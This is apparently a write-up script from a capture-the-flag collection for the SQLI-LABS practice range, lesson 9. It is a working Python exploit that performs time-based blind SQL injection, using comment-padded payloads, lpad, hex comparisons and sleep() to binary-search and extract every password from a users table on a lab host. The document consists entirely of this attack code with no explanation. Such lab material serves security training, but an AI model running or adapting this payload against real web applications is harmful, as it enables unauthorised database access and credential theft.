# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/WP汇总/各大靶场WP汇总.md
# TITLE: SQLI-LABS
# CATEGORY: web

import requests

url = 'http://192.168.237.128:12903/Less-9/?id='

password = ''
hexstr = ''
i = 1
while True:
    left = 32
    right = 128
    mid = (left+right) // 2
    while left < right:
        payload = f"1'/**/or/**/if(lpad((select/**/group_concat(distinct/**/password)/**/from/**/users),{i},1)>0x{hexstr}{hex(mid)[2:]},sleep(0.01),1)%23"

        res = requests.get(url + payload)
        if res.elapsed.microseconds >= 100000:
            left = mid + 1
        else:
            right = mid
        mid = (left + right) // 2
    if mid <= 32 or mid >= 127:
        break
    password += chr(mid)
    hexstr += hex(mid)[2:]
    i += 1
    print(password)
